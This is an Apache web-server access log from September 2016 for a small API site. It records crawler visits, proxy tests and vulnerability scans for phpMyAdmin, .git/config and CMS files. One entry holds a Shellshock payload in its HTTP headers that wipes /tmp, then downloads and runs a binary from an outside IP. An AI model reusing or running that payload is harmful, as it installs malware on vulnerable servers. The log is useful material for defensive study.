122.228.236.131 - - [21/Sep/2016:22:30:07 -0600] "OPTIONS / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.0 Safari/537.36"
180.76.15.157 - - [21/Sep/2016:22:36:51 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.97.106.37 - - [21/Sep/2016:23:00:52 -0600] "-" 408 - "-" "-"
174.23.26.123 - - [21/Sep/2016:23:07:42 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
174.23.26.123 - - [21/Sep/2016:23:07:42 -0600] "GET /v1/ HTTP/1.1" 200 55 "http://api.gospelblocks.com/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
93.184.239.147 - - [21/Sep/2016:23:37:32 -0600] "HEAD / HTTP/1.0" 200 - "-" "-"
185.25.148.240 - - [21/Sep/2016:23:54:09 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [22/Sep/2016:00:08:49 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
63.141.242.196 - - [22/Sep/2016:02:26:36 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.49.14.190 - - [22/Sep/2016:09:45:01 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
66.240.213.93 - - [22/Sep/2016:10:21:48 -0600] "GET / HTTP/1.0" 200 597 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
185.25.151.159 - - [22/Sep/2016:12:10:55 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
174.23.26.123 - - [22/Sep/2016:12:17:02 -0600] "-" 408 - "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [22/Sep/2016:12:47:17 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
174.23.26.123 - - [22/Sep/2016:12:47:22 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [22/Sep/2016:12:47:27 -0600] "GET /v1/ HTTP/1.1" 200 55 "http://api.gospelblocks.com/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [22/Sep/2016:12:47:27 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "http://api.gospelblocks.com/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [22/Sep/2016:12:47:37 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
174.23.26.123 - - [22/Sep/2016:12:47:38 -0600] "GET /v1/ HTTP/1.1" 200 55 "http://api.gospelblocks.com/v1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36"
222.174.5.7 - - [22/Sep/2016:13:44:35 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
222.174.5.7 - - [22/Sep/2016:13:44:38 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
222.174.5.7 - - [22/Sep/2016:14:13:05 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
222.174.5.7 - - [22/Sep/2016:14:13:11 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
186.220.104.64 - - [22/Sep/2016:17:00:12 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
186.220.104.64 - - [22/Sep/2016:17:00:12 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
186.220.104.64 - - [22/Sep/2016:17:00:13 -0600] "GET / HTTP/1.0" 200 597 "-" "Wget(linux)"
186.220.104.64 - - [22/Sep/2016:17:00:13 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
2607:fb90:5de:5c99:eddd:a2c2:b122:7e18 - - [22/Sep/2016:17:35:29 -0600] "-" 408 - "-" "-"
2607:fb90:5de:5c99:eddd:a2c2:b122:7e18 - - [22/Sep/2016:17:35:29 -0600] "-" 408 - "-" "-"
2607:fb90:5de:5c99:eddd:a2c2:b122:7e18 - - [22/Sep/2016:17:35:29 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [22/Sep/2016:18:27:35 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [22/Sep/2016:18:27:56 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [22/Sep/2016:18:28:16 -0600] "-" 408 - "-" "-"
46.166.188.214 - - [22/Sep/2016:23:59:21 -0600] "GET /.git/config HTTP/1.1" 404 209 "-" "fasthttp"
185.25.151.159 - - [23/Sep/2016:01:08:52 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.148.240 - - [23/Sep/2016:03:40:19 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
222.174.5.7 - - [23/Sep/2016:04:12:59 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
180.76.15.138 - - [23/Sep/2016:09:18:40 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
208.110.84.69 - - [23/Sep/2016:10:13:53 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
222.186.134.8 - - [23/Sep/2016:11:58:37 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
222.186.134.8 - - [23/Sep/2016:11:59:16 -0600] "GET /phpmyadmin HTTP/1.1" 404 208 "http://23.239.11.57/phpmyadmin" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)"
211.1.156.90 - - [23/Sep/2016:12:51:38 -0600] "HEAD / HTTP/1.0" 200 - "-" "-"
124.232.147.138 - - [23/Sep/2016:13:09:22 -0600] "GET / HTTP/1.1" 200 597 "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://222.174.5.7:253/hhu -O /tmp/China.Z-atlvP >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-atlvP >> /tmp/Run.sh;echo /tmp/China.Z-atlvP >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\"" "() { :; }; /bin/bash -c \"rm -rf /tmp/*;echo wget http://222.174.5.7:253/hhu -O /tmp/China.Z-atlvP >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-atlvP >> /tmp/Run.sh;echo /tmp/China.Z-atlvP >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh\""
66.249.84.210 - - [23/Sep/2016:13:14:18 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.212 - - [23/Sep/2016:13:14:18 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [23/Sep/2016:13:14:18 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [23/Sep/2016:13:14:18 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.212 - - [23/Sep/2016:13:14:18 -0600] "GET /v1/volume/3 HTTP/1.1" 200 3459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.210 - - [23/Sep/2016:13:14:18 -0600] "GET /v1/volume/1/book/1 HTTP/1.1" 200 1063 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
::1 - - [23/Sep/2016:13:14:24 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [23/Sep/2016:13:14:25 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [23/Sep/2016:13:14:26 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
185.25.151.159 - - [23/Sep/2016:14:10:09 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
63.141.242.195 - - [23/Sep/2016:17:49:30 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
198.204.224.238 - - [23/Sep/2016:21:34:06 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
69.30.227.218 - - [24/Sep/2016:01:07:06 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [24/Sep/2016:02:44:33 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
69.30.227.219 - - [24/Sep/2016:05:49:06 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [24/Sep/2016:07:12:36 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
167.114.103.142 - - [24/Sep/2016:11:57:55 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
185.93.185.10 - - [24/Sep/2016:12:48:27 -0600] "GET / HTTP/1.1" 200 597 "-" "Scanbot"
185.25.151.159 - - [24/Sep/2016:14:54:44 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.49.14.190 - - [24/Sep/2016:16:56:51 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
195.154.189.212 - - [24/Sep/2016:18:07:22 -0600] "GET /admin/config.php HTTP/1.1" 404 214 "-" "curl/7.19.7 (x86_64-redhat-linux-gnu) libcurl/7.19.7 NSS/3.21 Basic ECC zlib/1.2.3 libidn/1.18 libssh2/1.4.2"
141.212.122.49 - - [24/Sep/2016:19:33:49 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 zgrab/0.x"
185.49.14.190 - - [25/Sep/2016:01:59:50 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.218 - - [25/Sep/2016:02:35:53 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [25/Sep/2016:02:36:13 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [25/Sep/2016:02:36:33 -0600] "-" 408 - "-" "-"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
::1 - - [25/Sep/2016:03:24:01 -0600] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.6 (CentOS) PHP/5.6.25 (internal dummy connection)"
141.212.122.160 - - [25/Sep/2016:03:55:23 -0600] "GET /x HTTP/1.1" 400 226 "-" "Telesphoreo"
185.25.151.159 - - [25/Sep/2016:04:14:01 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
63.141.231.214 - - [25/Sep/2016:09:26:32 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [25/Sep/2016:11:00:56 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
212.129.54.164 - - [25/Sep/2016:15:30:33 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
91.196.50.33 - - [25/Sep/2016:16:00:17 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [25/Sep/2016:19:57:55 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
207.182.140.212 - - [25/Sep/2016:21:01:35 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; +http://www.komodia.com/newwiki/index.php/URL_server_crawler) KomodiaBot/1.0"
179.159.7.244 - - [25/Sep/2016:21:27:10 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
179.159.7.244 - - [25/Sep/2016:21:27:11 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
179.159.7.244 - - [25/Sep/2016:21:27:11 -0600] "GET / HTTP/1.0" 200 597 "-" "Wget(linux)"
179.159.7.244 - - [25/Sep/2016:21:27:11 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
63.141.231.194 - - [25/Sep/2016:22:56:31 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
149.56.28.239 - - [26/Sep/2016:03:30:30 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
180.76.15.9 - - [26/Sep/2016:04:42:38 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.30 - - [26/Sep/2016:04:42:38 -0600] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
180.76.15.19 - - [26/Sep/2016:04:43:49 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
208.110.84.70 - - [26/Sep/2016:05:42:30 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.25.151.159 - - [26/Sep/2016:06:19:26 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.218 - - [26/Sep/2016:10:50:02 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [26/Sep/2016:10:50:22 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [26/Sep/2016:10:50:42 -0600] "-" 408 - "-" "-"
180.76.15.23 - - [26/Sep/2016:12:18:10 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.25.151.159 - - [26/Sep/2016:14:42:22 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
109.236.84.106 - - [26/Sep/2016:15:31:42 -0600] "HEAD / HTTP/1.0" 200 - "-" "-"
93.174.93.194 - - [26/Sep/2016:16:08:28 -0600] "GET / HTTP/1.1" 200 597 "-" "-"
123.59.59.52 - - [26/Sep/2016:16:31:37 -0600] "GET http://www.qunar.com/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0"
46.166.190.188 - - [26/Sep/2016:17:19:30 -0600] "GET /.git/config HTTP/1.1" 404 209 "-" "fasthttp, Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36"
93.174.93.194 - - [26/Sep/2016:19:19:29 -0600] "GET / HTTP/1.1" 200 597 "-" "-"
91.196.50.33 - - [26/Sep/2016:19:43:20 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
91.196.50.33 - - [26/Sep/2016:23:56:57 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
93.174.93.218 - - [27/Sep/2016:00:19:55 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [27/Sep/2016:00:20:18 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [27/Sep/2016:00:20:38 -0600] "-" 408 - "-" "-"
54.149.198.51 - - [27/Sep/2016:05:58:45 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
195.62.53.168 - - [27/Sep/2016:05:59:23 -0600] "GET /r/errors.log HTTP/1.0" 404 210 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:30.N) Gecko/20110302 Firefox/30.0"
63.141.250.156 - - [27/Sep/2016:06:03:30 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
185.49.14.190 - - [27/Sep/2016:07:57:47 -0600] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [27/Sep/2016:09:02:19 -0600] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
218.92.147.79 - - [27/Sep/2016:15:16:33 -0600] "OPTIONS / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:16:41 -0600] "GET /media/jui/css/chosen.css HTTP/1.1" 404 222 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:16:49 -0600] "GET /installation/template/js/installation.js HTTP/1.1" 404 238 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:17:05 -0600] "GET /media/com_finder/js/indexer.js HTTP/1.1" 404 228 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:17:09 -0600] "GET /templates/atomic/css/template.css HTTP/1.1" 404 231 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:17:12 -0600] "GET /installation/CHANGELOG HTTP/1.1" 404 220 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:17:21 -0600] "GET /components/com_wrapper/wrapper.xml HTTP/1.1" 404 232 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
218.92.147.79 - - [27/Sep/2016:15:17:21 -0600] "GET /templets/default/style/dedecms.css HTTP/1.1" 404 232 "http://23.239.11.57" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 QQBrowser/3.8.3858.400"
141.212.122.16 - - [27/Sep/2016:18:10:24 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 zgrab/0.x"
185.49.14.190 - - [27/Sep/2016:18:20:07 -0600] "GET http://testp4.pospr.waw.pl/testproxy.php HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
66.249.84.208 - - [27/Sep/2016:19:03:28 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [27/Sep/2016:19:03:28 -0600] "GET /v1/ HTTP/1.1" 200 55 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [27/Sep/2016:19:03:28 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.208 - - [27/Sep/2016:19:03:28 -0600] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.249.84.210 - - [27/Sep/2016:19:03:28 -0600] "GET /v1/volume/3 HTTP/1.1" 200 3459 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
